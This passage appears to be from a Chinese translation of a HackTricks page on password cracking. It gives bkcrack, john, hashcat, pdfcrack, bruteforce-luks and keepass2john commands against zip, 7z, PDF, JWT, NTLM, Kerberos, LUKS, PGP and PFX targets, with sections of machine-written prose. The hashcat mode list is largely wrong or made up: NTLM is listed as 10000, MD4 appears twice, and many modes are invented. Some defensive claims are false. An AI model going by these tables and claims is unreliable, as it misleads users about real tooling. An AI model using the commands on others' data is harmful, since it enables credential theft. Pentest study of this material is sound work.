./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

7z是一种开源的文件压缩格式，它使用高度压缩算法来减小文件的大小。7z文件通常具有.7z文件扩展名。在渗透测试中，可以使用7z文件进行暴力破解攻击。

#### 7z暴力破解

暴力破解是一种尝试所有可能的组合来破解密码的方法。对于7z文件，可以使用暴力破解工具来尝试不同的密码组合，直到找到正确的密码为止。

以下是一些常用的7z暴力破解工具：

- **7z2hashcat**：将7z文件转换为hashcat可识别的格式，并使用hashcat进行暴力破解。
- **7z2john**：将7z文件转换为John the Ripper可识别的格式，并使用John the Ripper进行暴力破解。
- **fcrackzip**：用于暴力破解ZIP文件的工具，也可以用于7z文件。

在使用这些工具进行7z暴力破解时，可以尝试不同的密码字典和密码规则，以增加破解成功的几率。

#### 防御措施

为了防止7z文件被暴力破解，可以采取以下措施：

- 使用强密码：选择一个强密码，包括大写字母、小写字母、数字和特殊字符，并避免使用常见的密码。
- 加密文件：使用7z的加密功能对文件进行加密，以增加破解的难度。
- 限制尝试次数：设置7z文件的尝试次数限制，当达到一定次数时，文件将被锁定或删除。

通过采取这些措施，可以提高7z文件的安全性，减少暴力破解的风险。
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF

PDF（Portable Document Format）是一种用于显示文档的文件格式，它可以在不同操作系统和设备上保持一致的外观。PDF文件通常用于共享和存档文档，因为它们可以包含文本、图像、表格和其他多媒体元素。

PDF文件的结构是由一系列对象组成的，这些对象可以是字体、图像、页面内容等。每个对象都有一个唯一的标识符和一些属性。PDF文件还包含了一个交叉引用表，用于跟踪和定位对象。

PDF文件的加密和密码保护是保护文档内容的一种常见方法。加密可以防止未经授权的访问和修改，而密码保护可以限制对文档的打印、复制和编辑等操作。

在黑客攻击中，PDF文件可能被用作传播恶意软件的载体。黑客可以利用PDF文件中的漏洞来执行恶意代码或利用社会工程学手段诱使用户点击链接或下载附件。

为了保护自己免受PDF文件的攻击，用户应该保持软件和操作系统的更新，并谨慎打开来自未知来源的PDF文件。此外，使用安全的防病毒软件和防火墙也是保护自己的重要措施。
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### PDF Owner Password

要破解PDF所有者密码，请查看此链接：[https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### NTLM破解

NTLM（NT LAN Manager）是一种用于Windows操作系统的身份验证协议。在渗透测试中，破解NTLM哈希是一种常见的攻击技术，可以通过暴力破解来获取用户的密码。

#### 基本原理

NTLM哈希是通过对用户密码进行散列计算而生成的。攻击者可以使用暴力破解技术，尝试使用不同的密码来计算哈希值，然后与目标系统中存储的哈希值进行比对。如果找到匹配的哈希值，就意味着找到了用户的密码。

#### 工具和技术

以下是一些常用的NTLM破解工具和技术：

- Hashcat：一款强大的密码破解工具，支持多种哈希算法，包括NTLM。
- John the Ripper：另一款流行的密码破解工具，也支持NTLM哈希破解。
- Hydra：一款强大的网络登录破解工具，可以用于暴力破解NTLM哈希。

#### 防御措施

为了防止NTLM哈希破解攻击，可以采取以下措施：

- 使用强密码：选择复杂且难以猜测的密码，可以增加破解的难度。
- 禁用NTLM哈希存储：将系统配置为不存储NTLM哈希，而是使用更安全的身份验证协议，如Kerberos。
- 强制使用多因素身份验证：通过使用多个身份验证因素，如密码和令牌，可以提高系统的安全性。

#### 总结

NTLM破解是一种常见的攻击技术，可以通过暴力破解NTLM哈希来获取用户密码。为了防止这种攻击，应采取适当的防御措施，如使用强密码、禁用NTLM哈希存储和强制使用多因素身份验证。
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass

Keepass是一种开源的密码管理器，它可以帮助用户创建和存储强密码。它使用加密算法来保护密码数据库，以防止未经授权的访问。Keepass还提供了自动填充功能，可以方便地在网页表单中填写用户名和密码。此外，Keepass还支持插件和扩展，可以增强其功能和安全性。

#### Brute Force攻击

Brute Force攻击是一种试图通过尝试所有可能的密码组合来破解密码的攻击方法。对于Keepass来说，Brute Force攻击可以通过尝试不同的密码来解密密码数据库。这种攻击方法需要耗费大量的时间和计算资源，因为密码的组合可能非常庞大。为了防止Brute Force攻击，Keepass使用了一些安全措施，如限制尝试次数和增加密码复杂性要求。

#### 防御措施

为了保护Keepass免受Brute Force攻击，可以采取以下措施：

- 使用强密码：选择一个复杂且难以猜测的密码，包括字母、数字和特殊字符的组合。
- 增加密码复杂性要求：在Keepass设置中，可以设置密码的最小长度和要求使用特殊字符等。
- 锁定账户：在一定的尝试次数后，锁定账户一段时间，以防止连续的Brute Force攻击。
- 使用双因素身份验证：通过使用双因素身份验证，可以增加对Keepass的访问控制，使其更加安全。

#### 注意事项

尽管Keepass具有一些防御措施来防止Brute Force攻击，但仍然有可能受到攻击。因此，用户应该采取适当的安全措施来保护其密码数据库，如定期更改密码、备份数据库等。此外，还应该避免使用弱密码和将密码数据库暴露在不安全的环境中。
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

Keberoasting是一种攻击技术，用于获取域控制器中的弱密码。这种攻击利用了Kerberos身份验证协议中的漏洞，该协议用于在Windows域环境中进行身份验证。

攻击者首先扫描目标网络，寻找使用Kerberos身份验证的服务。然后，他们使用Kerberoasting工具来请求目标服务的服务票据（Service Ticket）。服务票据是由域控制器签名的，用于验证用户身份的凭证。

一旦攻击者获得了服务票据，他们可以将其导出到本地，并使用破解工具对其进行离线破解。由于许多服务使用弱密码进行身份验证，因此攻击者有很大的机会成功破解这些票据。

为了防止Keberoasting攻击，可以采取以下措施：

- 使用强密码策略，确保所有用户的密码强度足够。
- 定期更改密码，并禁用旧密码。
- 监控域控制器日志，以便检测异常活动。
- 使用多因素身份验证，增加身份验证的安全性。
- 更新和修补系统，以防止已知的Kerberos漏洞被利用。

Keberoasting是一种有效的攻击技术，因此组织应该采取适当的措施来保护其域控制器和用户密码的安全。
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Lucks image

#### 方法 1

安装：[https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### 方法2

Brute force is a common method used to crack passwords or gain unauthorized access to systems. It involves systematically trying every possible combination of characters until the correct password is found. This method can be time-consuming and resource-intensive, but it can be effective if the password is weak or easily guessable.

To perform a brute force attack, you will need a tool or script that can automate the process of trying different passwords. There are many tools available for this purpose, such as Hydra, Medusa, and John the Ripper. These tools can be configured to try different combinations of characters, including letters, numbers, and symbols, until the correct password is discovered.

When attempting a brute force attack, it is important to consider the complexity of the password being targeted. Longer and more complex passwords will take significantly longer to crack compared to shorter and simpler passwords. Additionally, some systems may have security measures in place to detect and block brute force attacks, such as account lockouts or rate limiting.

It is also worth noting that brute force attacks are generally considered to be illegal and unethical unless performed with proper authorization. Always ensure that you have the necessary permissions and legal rights before attempting any form of hacking or unauthorized access.
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
另一个Luks BF教程：[http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### PGP/GPG私钥

A PGP/GPG private key is a cryptographic key used in the Pretty Good Privacy (PGP) and GNU Privacy Guard (GPG) encryption systems. It is used to decrypt messages that have been encrypted with the corresponding public key. The private key should be kept secret and protected, as it is the key that allows access to the encrypted data.

To generate a PGP/GPG private key, you can use tools like GnuPG or Kleopatra. These tools will generate a pair of keys: a private key and a corresponding public key. The private key should be stored securely, preferably in an encrypted format, and protected with a strong passphrase.

If you lose your private key, you will not be able to decrypt any messages encrypted with your public key. It is important to keep backups of your private key in a safe place. Additionally, you should consider creating a revocation certificate for your private key, which can be used to invalidate the key in case it is compromised or lost.

Remember to always keep your private key confidential and protect it from unauthorized access.
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI主密钥

使用[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)然后运行john

### Open Office密码保护的列

如果你有一个xlsx文件，其中有一列被密码保护，你可以取消保护：

* **将其上传到Google Drive**，密码将自动删除
* **手动删除**它：
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### PFX证书

PFX证书是一种常用的数字证书格式，用于在网络通信中进行身份验证和加密。PFX代表“个人交换格式”，它将私钥和公钥存储在同一个文件中。这种证书通常用于安全套接字层（SSL）和传输层安全（TLS）协议，以确保通信的机密性和完整性。

PFX证书通常需要密码来保护私钥的安全。在使用PFX证书进行身份验证时，私钥将用于生成数字签名，以证明证书的真实性。公钥则用于验证数字签名，确保通信的安全性。

PFX证书可以通过多种方式进行破解。其中一种常见的方法是使用暴力破解技术，通过尝试不同的密码组合来破解PFX证书的密码。这可以通过使用专门的工具和字典文件来实现。

暴力破解PFX证书需要耗费大量的计算资源和时间，因此在实施此类攻击时需要谨慎。此外，破解PFX证书是非法的行为，可能会导致法律后果。

为了保护PFX证书的安全，建议使用强密码，并定期更改密码。此外，应该将PFX证书存储在安全的位置，并限制对其访问的权限，以防止未经授权的人员获取证书的私钥。
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
![](<../.gitbook/assets/image (9) (1) (2).png>)

使用[**Trickest**](https://trickest.io/)轻松构建和自动化由全球最先进的社区工具提供支持的工作流程。
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 工具

**哈希示例：** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### 哈希标识符
```bash
hash-identifier
> <HASH>
```
### 字典列表

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **字典生成工具**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**：**高级键盘行走生成器，可配置基本字符、键盘映射和路径。
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### John变异

阅读 _**/etc/john/john.conf**_ 并进行配置
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Hashcat攻击

* **字典攻击** (`-a 0`) 使用规则

**Hashcat**已经带有一个**包含规则的文件夹**，但你可以在[**这里找到其他有趣的规则**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)。
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **字典组合**攻击

可以使用hashcat将两个字典组合成一个。\
如果列表1包含单词**"hello"**，而第二个列表包含两行单词**"world"**和**"earth"**。将生成单词`helloworld`和`helloearth`。
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **掩码攻击** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* 字典 + 掩码 (`-a 6`) / 掩码 + 字典 (`-a 7`) 攻击
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Hashcat模式

Hashcat是一款强大的密码破解工具，支持多种不同的破解模式。下面是一些常用的Hashcat模式：

- **0**: Straight模式，用于破解未加密的密码。
- **100**: DCC模式，用于破解DCC（Distributed Checksum Clearinghouse）密码哈希。
- **2500**: WPA/WPA2模式，用于破解WPA和WPA2无线网络密码。
- **3000**: LM模式，用于破解Windows LM哈希。
- **5000**: MD5模式，用于破解MD5哈希。
- **9000**: MD4模式，用于破解MD4哈希。
- **10000**: NTLM模式，用于破解Windows NTLM哈希。
- **11000**: Domain Cached Credentials (DCC2)模式，用于破解DCC2密码哈希。
- **11800**: SHA1模式，用于破解SHA1哈希。
- **14000**: SHA256模式，用于破解SHA256哈希。
- **17000**: SHA512模式，用于破解SHA512哈希。
- **22000**: WPA/WPA2 Enterprise模式，用于破解WPA和WPA2企业级无线网络密码。
- **24000**: Cisco-PIX模式，用于破解Cisco PIX哈希。
- **24100**: Cisco-ASA模式，用于破解Cisco ASA哈希。
- **25000**: WPA/WPA2 PMK模式，用于破解WPA和WPA2预共享密钥。
- **30000**: Oracle 11g模式，用于破解Oracle 11g哈希。
- **31000**: Oracle 12c模式，用于破解Oracle 12c哈希。
- **50000**: MySQL323模式，用于破解MySQL 3.23哈希。
- **51000**: MySQL4.1/MySQL5模式，用于破解MySQL 4.1和MySQL 5哈希。
- **52000**: Oracle 7-10g模式，用于破解Oracle 7-10g哈希。
- **53000**: Oracle 11g/12c模式，用于破解Oracle 11g和Oracle 12c哈希。
- **54000**: SHA-3 (Keccak)模式，用于破解SHA-3 (Keccak)哈希。
- **55000**: NetNTLMv1-VANILLA / NetNTLMv1+ESS模式，用于破解NetNTLMv1-VANILLA和NetNTLMv1+ESS哈希。
- **56000**: NetNTLMv2模式，用于破解NetNTLMv2哈希。
- **57000**: Cisco-IOS模式，用于破解Cisco IOS哈希。
- **58000**: Android PIN模式，用于破解Android PIN密码。
- **60000**: RipeMD160模式，用于破解RipeMD160哈希。
- **61000**: Whirlpool模式，用于破解Whirlpool哈希。
- **62100**: TrueCrypt模式，用于破解TrueCrypt哈希。
- **62200**: VeraCrypt模式，用于破解VeraCrypt哈希。
- **62300**: UEFI模式，用于破解UEFI哈希。
- **62400**: GOST R 34.11-94模式，用于破解GOST R 34.11-94哈希。
- **63000**: AIX {smd5}模式，用于破解AIX {smd5}哈希。
- **64000**: AIX {ssha1}模式，用于破解AIX {ssha1}哈希。
- **65000**: AIX {ssha256}模式，用于破解AIX {ssha256}哈希。
- **67000**: AIX {ssha512}模式，用于破解AIX {ssha512}哈希。
- **9000**: MD4模式，用于破解MD4哈希。

这些只是Hashcat支持的一部分模式，你可以根据需要选择适合的模式来破解不同类型的密码哈希。
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# 破解Linux哈希 - /etc/shadow文件

## 简介

在Linux系统中，用户的密码哈希值存储在`/etc/shadow`文件中。这个文件对于黑客来说是一个宝贵的目标，因为它包含了用户账户的敏感信息。通过破解这些哈希值，黑客可以获取用户的密码，从而进一步入侵系统。

## 哈希破解方法

破解Linux哈希的常见方法是使用暴力破解技术。这种方法通过尝试不同的密码组合，将其哈希值与目标哈希进行比较，以找到匹配的密码。

以下是一些常用的哈希破解工具和技术：

### 1. John the Ripper

John the Ripper是一款流行的密码破解工具，可以用于破解Linux哈希。它支持多种哈希算法，并且可以使用字典攻击、暴力破解和混合攻击等多种破解模式。

### 2. Hashcat

Hashcat是另一款功能强大的密码破解工具，支持多种哈希算法和破解模式。它可以利用GPU的并行计算能力，加快破解速度。

### 3. Hydra

Hydra是一款网络登录破解工具，可以用于破解Linux系统的密码。它支持多种协议和服务，包括SSH、FTP、Telnet等。

### 4. 自定义脚本

除了使用现有的破解工具，黑客还可以编写自己的脚本来破解Linux哈希。这种方法可以根据具体情况进行定制，提高破解效率。

## 防御措施

为了防止黑客破解Linux哈希，以下是一些推荐的防御措施：

- 使用强密码：选择足够复杂和长的密码，包括字母、数字和特殊字符的组合。
- 使用哈希算法：选择安全的哈希算法，如SHA-512，以增加破解难度。
- 使用盐值：将随机生成的盐值与密码哈希结合，增加破解的复杂性。
- 定期更改密码：定期更改密码可以减少黑客破解的机会。
- 限制登录尝试：限制登录尝试次数，防止暴力破解攻击。

通过采取这些防御措施，可以提高系统的安全性，减少黑客破解Linux哈希的成功率。
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# 破解Windows哈希

## NTLM Hashes

### 通过暴力破解破解NTLM哈希

暴力破解NTLM哈希是一种常见的攻击技术，可以用于破解Windows用户的密码。以下是一些常用的工具和技术：

- **John the Ripper**：这是一个流行的密码破解工具，可以用于破解NTLM哈希。它支持多种破解模式，包括字典攻击和暴力破解。
- **Hashcat**：这是另一个强大的密码破解工具，可以用于破解NTLM哈希。它支持多种攻击模式，包括字典攻击、暴力破解和组合攻击。
- **字典攻击**：这是一种基于预先生成的密码列表的攻击技术。攻击者可以使用常见密码列表或自定义密码列表来尝试破解NTLM哈希。
- **暴力破解**：这是一种尝试所有可能的密码组合的攻击技术。攻击者可以使用暴力破解工具来尝试破解NTLM哈希。

### 使用Rainbow Tables破解NTLM哈希

彩虹表是一种预先计算的哈希值和对应明文密码的映射表。攻击者可以使用彩虹表来快速破解NTLM哈希。以下是一些常用的彩虹表工具：

- **RainbowCrack**：这是一个流行的彩虹表工具，可以用于破解NTLM哈希。它支持多种彩虹表文件格式，并且可以使用多个彩虹表同时进行破解。

## LM Hashes

### 通过暴力破解破解LM哈希

与NTLM哈希相比，LM哈希更容易破解，因为它使用较弱的算法和较短的密钥空间。以下是一些常用的工具和技术：

- **John the Ripper**：这是一个流行的密码破解工具，可以用于破解LM哈希。它支持多种破解模式，包括字典攻击和暴力破解。
- **Hashcat**：这是另一个强大的密码破解工具，可以用于破解LM哈希。它支持多种攻击模式，包括字典攻击、暴力破解和组合攻击。
- **字典攻击**：这是一种基于预先生成的密码列表的攻击技术。攻击者可以使用常见密码列表或自定义密码列表来尝试破解LM哈希。
- **暴力破解**：这是一种尝试所有可能的密码组合的攻击技术。攻击者可以使用暴力破解工具来尝试破解LM哈希。

### 使用彩虹表破解LM哈希

与NTLM哈希类似，攻击者也可以使用彩虹表来破解LM哈希。彩虹表工具和技术与上述相同。

## 总结

破解Windows哈希是一项常见的攻击技术，攻击者可以使用暴力破解工具、字典攻击、彩虹表等方法来尝试破解NTLM和LM哈希。为了保护密码安全，用户应该使用强密码，并定期更改密码。
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
# 破解常见应用程序哈希

## MD5

MD5是一种常见的哈希算法，用于加密密码和验证文件完整性。然而，由于其易受碰撞攻击的特性，MD5已经不再被视为安全的哈希算法。

### 破解MD5哈希

要破解MD5哈希，可以使用以下方法之一：

1. 字典攻击：使用预先生成的哈希字典，将哈希与字典中的值进行比对，以找到匹配的明文密码。
2. 彩虹表攻击：使用预先计算的彩虹表，将哈希与表中的值进行比对，以找到匹配的明文密码。
3. 暴力破解：尝试所有可能的密码组合，直到找到与哈希匹配的明文密码。

## SHA1

SHA1是一种常见的哈希算法，用于加密密码和验证文件完整性。然而，由于其易受碰撞攻击的特性，SHA1已经不再被视为安全的哈希算法。

### 破解SHA1哈希

要破解SHA1哈希，可以使用以下方法之一：

1. 字典攻击：使用预先生成的哈希字典，将哈希与字典中的值进行比对，以找到匹配的明文密码。
2. 彩虹表攻击：使用预先计算的彩虹表，将哈希与表中的值进行比对，以找到匹配的明文密码。
3. 暴力破解：尝试所有可能的密码组合，直到找到与哈希匹配的明文密码。

## SHA256

SHA256是一种常见的哈希算法，用于加密密码和验证文件完整性。目前，SHA256被广泛接受为安全的哈希算法。

### 破解SHA256哈希

由于SHA256是一种强大的哈希算法，目前没有已知的有效方法可以直接破解SHA256哈希。暴力破解SHA256哈希是不可行的，因为尝试所有可能的密码组合需要极大的计算资源和时间。

## 总结

破解常见应用程序哈希通常涉及使用字典攻击、彩虹表攻击或暴力破解的方法。然而，对于较强的哈希算法（如SHA256），破解哈希变得非常困难，甚至不可行。因此，使用安全的哈希算法和强密码是保护个人信息和数据安全的重要措施。
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
使用[**Trickest**](https://trickest.io/)轻松构建和**自动化工作流程**，使用世界上**最先进的**社区工具。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
